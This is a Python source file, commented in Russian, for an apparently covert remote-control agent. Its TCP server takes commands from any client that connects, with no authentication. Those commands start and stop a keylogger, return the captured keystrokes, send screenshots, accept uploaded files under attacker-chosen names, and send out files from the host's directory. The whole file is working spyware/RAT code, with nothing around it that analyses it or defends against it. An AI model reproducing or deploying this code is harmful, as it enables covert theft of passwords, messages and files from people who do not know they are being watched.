import pickle
import socket
import threading
import atexit
import os
import struct
import sys
import pyautogui
from pynput.keyboard import Listener

# Константы
FILE_NAME = "./keystrokes.log"
recording = False
output = None
keyboard_listener = None  # Хранить слушателя клавиатуры

# Функция для записи в лог
def log_action(action):
    print(f"Logging action: {action}")
    with open(FILE_NAME, "a") as f:
        f.write(action + "\n")

# Функция для очистки лог-файла
def clear_log_file():
    with open(FILE_NAME, "w") as f:
        f.truncate()  # Очищаем содержимое файла
    log_action("Log file cleared.")  # Записываем в лог, что файл очищен

# Функция для записи нажатий клавиш
def on_press(key):
    try:
        log_action(f"Key pressed: {key.char}")  # Записываем символ
    except AttributeError:
        log_action(f"Special key pressed: {key}")  # Записываем специальные клавиши (Shift, Ctrl и т.д.)

# Функция для завершения работы
def onexit():
    if output:
        output.close()
    if keyboard_listener:
        keyboard_listener.stop()  # Останавливаем слушатель

# Обработка входящих соединений
def handle_client(conn):
    global recording, output, keyboard_listener
    print("Client connected")

    # Отправка IP-адреса сервера
    ip_address = socket.gethostbyname(socket.gethostname())
    conn.sendall(f"SERVER_IP:{ip_address}".encode('utf-8'))

    while True:
        command = conn.recv(1024).decode('utf-8')
        if command:
            print("Received command: {}".format(command))
        else:
            continue


        if command == "keylogger_start":
            if not recording:
                print("Attempting to start keylogger...")
                recording = True
                output = open(FILE_NAME, "a")
                atexit.register(onexit)
                log_action("Started recording keyboard inputs.")
                print("Starting Listener...")
                keyboard_listener = Listener(on_press=on_press)
                keyboard_listener.start()
                print("Listener started...")
                conn.sendall("Keylogger started.".encode('utf-8'))
                print("Keylogger started.")

            else:
                conn.sendall("Keylogger is already running.".encode('utf-8'))

        elif command == "keylogger_stop":
            if recording:
                recording = False
                log_action("Stopped recording.")
                if keyboard_listener:
                    keyboard_listener.stop()
                conn.sendall("Keylogger stopped.".encode('utf-8'))
                print("Keylogger stopped.")
            else:
                conn.sendall("Keylogger is not running.".encode('utf-8'))

        elif command == "keylogger_show":
            with open(FILE_NAME, "r") as f:
                log_data = f.read()
            if log_data:
                conn.sendall(log_data.encode('utf-8'))
            else:
                conn.sendall("No logs available.".encode('utf-8'))

        elif command == "keylogger_clear":
            clear_log_file()
            conn.sendall("Logs cleared.".encode('utf-8'))

        elif command == "screenshot":
            screenshot = pyautogui.screenshot()
            imageBytes = pickle.dumps(screenshot)
            conn.sendall(struct.pack(">Q", len(imageBytes)) + imageBytes)
            print("Screenshot sent.")

        elif command.startswith("receive_file:"):
            file_name = command.split(":")[1]
            conn.sendall(b"READY_TO_RECEIVE")
            print("Ready to receive file: {}".format(file_name))

            # Получаем размер файла
            packed_file_size = conn.recv(8)
            file_size = struct.unpack(">Q", packed_file_size)[0]
            print("Receiving file of size {} bytes...".format(file_size))

            # Получаем и сохраняем файл
            received_size = 0
            with open(file_name, "wb") as f:
                while received_size < file_size:
                    data = conn.recv(1024)
                    if not data:
                        break
                    f.write(data)
                    received_size += len(data)
            print("File '{}' successfully received.".format(file_name))
            conn.sendall(b"File received successfully")

        elif command.startswith("get_file"):
            directory = "./"
            if not os.path.exists(directory):
                os.makedirs(directory)

            # Отправляем список файлов клиенту
            files = os.listdir(directory)
            files_list = "\n".join(files) if files else "No files available"
            conn.sendall(files_list.encode('utf-8'))

            # Ждем выбор файла от клиента
            file_name = conn.recv(1024).decode('utf-8')
            file_path = os.path.join(directory, file_name)

            if os.path.exists(file_path):
                conn.sendall(b"READY_TO_SEND")
                file_size = os.path.getsize(file_path)
                conn.sendall(struct.pack(">Q", file_size))

                # Отправляем файл клиенту
                with open(file_path, "rb") as f:
                    while True:
                        bytes_read = f.read(1024)
                        if not bytes_read:
                            break
                        conn.sendall(bytes_read)
                print("File '{}' sent to client.".format(file_path))
            else:
                conn.sendall(b"FILE_NOT_FOUND")
        else:
            conn.sendall(b"Command not recognized")

def start_server():
    # Create a TCP socket for client connections
    tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_server_socket.bind(('', 8080))
    tcp_server_socket.listen(5)  # Allow up to 5 pending connections
    print("Server listening for TCP connections on port 8080...")

    # Create a separate thread for listening to UDP broadcasts
    threading.Thread(target=udp_broadcast_listener, daemon=True).start()

    while True:
        conn, addr = tcp_server_socket.accept()
        print(f"Client connected from {addr}")
        # Handle the client in a new thread
        threading.Thread(target=handle_client, args=(conn,), daemon=True).start()

def udp_broadcast_listener():
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind(('', 8081))  # Use a different port for UDP broadcasts
        print("Server listening for broadcast...")
        while True:
            data, addr = server_socket.recvfrom(1024)
            if data.decode('utf-8') == "DISCOVER_SERVER":
                server_ip = socket.gethostbyname(socket.gethostname())
                server_socket.sendto(f"SERVER_IP:{server_ip}".encode('utf-8'), addr)


if __name__ == "__main__":
    start_server()
